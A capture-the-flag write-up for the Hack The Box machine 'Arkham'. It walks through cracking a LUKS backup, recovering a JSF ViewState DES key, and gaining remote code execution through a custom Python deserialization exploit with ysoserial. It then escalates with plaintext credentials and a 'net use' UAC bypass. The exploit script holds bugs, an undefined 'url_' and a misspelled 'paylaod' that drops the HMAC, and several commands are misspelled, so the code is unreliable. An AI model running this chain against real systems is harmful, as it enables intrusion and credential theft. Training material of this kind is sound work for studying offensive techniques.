<p align="center">
<img src="https://github.com/cyberwr3nch/hackthebox/blob/master/writeups/assets/Arkham.png" alt='HTB_logo'>
</p>

### Description
- Accessing an anonymous smb share provides us with the `appserver.zip`
- Extracting the zip file we get an LUKS encrypted `backup` image (.img) file
- Cracking the LUKS encrypted image file we get access to the tomcat config files, where we can obtain the secret key which is used to encrypt the `javax.faces.ViewState`
- Developing a custom script to exploit the java deserialzation vulnerability in javax.faces.ViewState
- Since RCE is available via java deserialzation, reverse shell is obtained
- User txt is obtained, and a `.ost` file is obtained which is a microsoft Outlook folder
- Analyzing the folder provides us with a draft message which contains passphrase for the user batman
- Entering the PSSession as Batman internally, executing commands to obtain reverse shell as batman
- Looking at the groups batman belongs to admininstrator but the permissons are limited
- Probality of an UAC protection, bypass it to obtain root.txt

### Difficulty
Windows - Medium

### Enumeration
- Open ports `80 (http), 135 (msrpc), 139 (netbios), 445 (SMB), 8080 (http) `
- On the webpage on port 80, default IIS page is enumerated
- Moving to port 8080, a webpage from `mask.inc` is enumerated
- A link for the `subscription` is available leading to `userSubscribe.faces`
- Intercepting the request made by the userSubscribe.faces, java id, faces.View states are being passed as a parameter
- The **value** for `javax.faces.ViewState` seems like a base64 string
- A simple google search on `javax.faces.ViewState` shows the misconfiguration and a sample ViewState hash type
- The `base64`'ed ViewState value obtained from the request to the userSubscribe.faces seemed to be encrypted
- Enumerating the smb shares with `anonymous` user
- The `batshare` smb share has a appserver.zip
- Getting the file and after unzipping it `two` files have been obtained `IMPORTANT.TXT & backup.img`
- The backup.img is a `LUKS encrypted file` 
- Decrypting and mounting the luks encrypted file, some files and folders are enumerated
- In the `tomcat-stuffs` folder many config files has been enumerated
- The secret key for encoding the facelets has been obtained from the `web.xml.bak` file
- Creating a custom script to decrypt the value which was sent while making the request
- The custom script decrypts the hash obtained from faces.View 
- Generate a java serialized payloaded with [`ysoserial`](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar) with the `CommonCollections5` 
- Converting the payload.bin to a hex format and tweaking the script to get input command from the user and process the request
- Make a quick ping command working check with `tcpdump -i tun0 icmp`


### User Flag:
- With the RCE being successful and working, transfer the [netcat](https://eternallybored.org/misc/netcat/) to the machine and obtain the reverse shell as `Alfred` and user.txt is obtained
- Looking at the privs for the user alfred normal privs
- In the backup folder of alfred an backup.zip is found
- Tranfer the backup.zip file to the machine
- By unzipping it we get a `.ost` (Microsoft Outlook email Folder) file
- For accessing this file [`readpst`](https://linux.die.net/man/1/readpst#:~:text=readpst%20is%20a%20program%20that,mbox%20structure%2C%20or%20separate%20emails.) utility is used
- A mailbox file will be generated after converting the `ost` with the readpst. The mailbox file will have the extension `.mbox`
- The mailbox file will be difficult to read, hence making use of the [`evolution`](https://rc.partners.org/kb/article/2702) `evolution Draft.mbox`
- With the opening of the evolution, the mail to `batman` from `alfred` is avilable showing the picture of the batman's password
- Using it in the smbshare shows that we have minimal access than the user alfred
- Try executing the commands as the batman within the computer with [Invoke-Command](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command?view=powershell-7#example-2--run-a-command-on-a-remote-server), Running the command as the desired user

### Root Flag:
- Obtaining the reverse shell as batman, enumerating the admininstrator group,  batman belongs to admininstrator group
- Enumerating all the privs available for the batman, shows that he belongs to the admininstrator group but the priviledges are less
- Navigating to 'C:\Admininstrator' is successful but not listable
- So there might be `UAC` implemented which needs to be bypassed

#### Way 1:
- By using the `net use` command to map the desired disk to the share (its can be a share which doesnt exists)
- Navigating to the mapped drive, the root.txt can be obtained

#### Way 2:
- Create a dll and escalate to an interactive process, [blog](https://egre55.github.io/system-properties-uac-bypass/)
- fin

### Commands

```bash
# decrypting the luks encrypted img file
# gather information on the luks image
cryptsetup luksDump backup.img

# payload offset -> Note it

# gathering headers, dd is a utility for converting and copying files
# dd inputfile(if=) outputfile (of=) blocksize (bs=512) count{payloadOffset+1} (count=)

dd if=backup.img of=arkham-luks bs=512 count=4097

hashcat -m 14600 arkham-luks /opt/wordlists/rockyou.TXT
# luks encryption might take a while to crack,password: batmanforever

# mounting the LUKS encrypted backup image file
cryptsetup luksOpen backup.img arkham
# passphrase for backup.img: batmanforever

# the opened backup.img with the name of arkham will be found in /dev/mapper
ls /dev/mapper
mount /dev/mapper/arkham /mnt 
```

```python
# vi exploit.py
'''
The secret key which is used to encrypt the faces.View parameter has been obtained
The default encryption algorithm used by the apache facelets is DES
This can be obtained from the documentation of apache myfaces
The value 'or.apache.myfaces.ALGORITHM' specifies the type of algorith of the secret key. If its not mentioned in the source then it will take up the default algorithm which is  which is DES
DES is decrypted with the pyDes module
when executing the script the without adding null characters the script resulted in error, stating that the hash should be a miltiple of 8 bytes
But the length of the bytes we have is 92, need four more characters to deocde
adding a byte code of null bytes to the faces.View hash we can decrypt the hash
'''


from base64 import b64decode, b64encode
from hashlib import sha1
import pyDes, hmac
import requests

url = "http://10.10.10.130:8080/userSubscribe.faces"

# opening the created payload for reading in the binary format, passing the read value to the encrypting function
def create_payload():
	payload = open('payload.bin', 'rb').read()
	return encrypt_payload(payload)

# the encryption function, is loaded with the secret key, padding mode from DES. The payload is then encrypted with sha1.
# The final encrypted sha1 payload is encoded with the base64 and is passed to the create_payload() since it returns the value
def encrypt_payload(payload):
	key = b64decode("SnNGOTg3N10=")
	obj = pyDes.des(key, pyDes.ECB, padmode=pyDes.PAD_PKCS5)
	enc = obj.encrypt(payload)
	hash_val = (hmac.new(key, bytes(enc), sha1).digest())
	paylaod = enc + hash_val
	return b64encode(payload)

# decrypt function to check the correct padding and working of the script
def decrypt_view_state(view_state):
	key = b64decode("SnNGOTg3N10=")
	obj = pyDes.des(key, pyDes.ECB, padmode=pyDes.PAD_PKCS5)
	view_state = b64decode(view_state)
	view_state = view_state + b'\x00\x00\x00\x00' # adding four null bytes for padding 
	dec = obj.decrypt(view_state)
	return dec
# print(decrypt_view_state({javax.faces.ViewState hash}))

# making a  request to the webpage with the parameter we want our payload to be, makes the req and makes RCE
# the create_payload() is descripted above, the payload is passed as the data
def exploit():
	view_state = create_payload()
	data = {'javax.faces.ViewState': view_state}
	requests.post(url=url_, data = data)

exploit()
```

```bash
# generating serialized payload
java -jar ysoserial-master-SNAPSHOT.jar CommonCollections5 'cmd /c ping -n 1 10.10.14.3' > payload.bin
```

```bash
# transfering the backup.zip with certutil, certuil converts it into base64
certuil -encode backup.zip C:\\windows\\temp\\backup.b64
```

```bash
# running the command as the user batman
$pass = ConvertTo-SecureString 'Zx^#QZX+T!123' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("batman", $pass)
Invoke-Command -Computer ARKHAM -ScriptBlock {whoami} -Credential $cred
# computer name enumerated from the "hostname" command

# try in pwsh / internal powershell
Invoke-Command -ComputerName ARKHAM -Credential ARKHAM\Batman -ScriptBlock { Get-Culture }

```

```bash
# UAC Bypass with net use
# The drive z is not available 
net use Z:\ \\127.0.0.1\c$

z:
type users\admininstrator\Desktop\root.txt
```
